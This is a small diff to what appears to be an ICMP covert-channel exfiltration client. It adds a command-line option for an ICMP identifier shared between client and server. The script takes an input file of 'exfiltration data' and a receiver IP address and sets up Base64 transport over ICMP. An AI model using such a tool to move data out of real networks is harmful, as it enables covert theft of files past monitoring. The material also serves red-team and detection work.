@@ -9,6 +9,7 @@ parser.add_argument("inputfile", help="File to read exfiltration data from")
 parser.add_argument("receiver", help="IPv4 of receiver")
 parser.add_argument("-d", "--delay", type=int, default=0, help="Delay between sending packets in ms")
 parser.add_argument("-e", "--encoding", type=str, default="utf-8", help="Encoding to use")
+parser.add_argument("-i", "--identifier", type=int, default=1, help="Identifer for ICMP packets shared between client and server (1-65535)")
 parser.add_argument("-v", "--verbose", action='store_true', help="Increase output verbosity")
 args = parser.parse_args()
 
@@ -28,6 +29,7 @@ if os.path.exists(args.inputfile):
 
 # Step 1: Initialize ICMP channel
 icmp = ICMP_Channel_Client(logger)
+icmp.set_icmp_identifier(args.identifier)
 
 # Step 2: Set up transport encoding
 transport = Channel_Transport.Base64(args.encoding)
